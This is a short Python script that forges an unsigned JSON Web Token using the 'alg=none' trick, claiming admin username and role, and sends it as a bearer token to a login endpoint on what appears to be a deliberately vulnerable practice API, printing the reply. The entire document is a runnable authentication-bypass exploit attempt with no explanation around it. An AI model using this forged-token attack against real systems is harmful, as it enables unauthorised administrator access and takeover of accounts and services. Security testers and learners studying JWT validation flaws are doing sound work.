import base64, json, requests, sys

# Create a JWT with alg=none
header = {'alg': 'none', 'typ': 'JWT'}
payload = {'username': 'admin', 'role': 'admin', 'iat': 1700000000}

def b64enc(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).decode().rstrip('=')

token = b64enc(header) + '.' + b64enc(payload) + '.'
print('Token:', token)

# Test against the login endpoint
try:
    resp = requests.post('https://duck-store.escape.tech/api/v1/auth/login', 
        headers={'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'},
        json={'username':'admin','password':'admin'}, timeout=10)
    print('Status:', resp.status_code)
    print('Response:', resp.text[:500])
except Exception as e:
    print('Error:', e)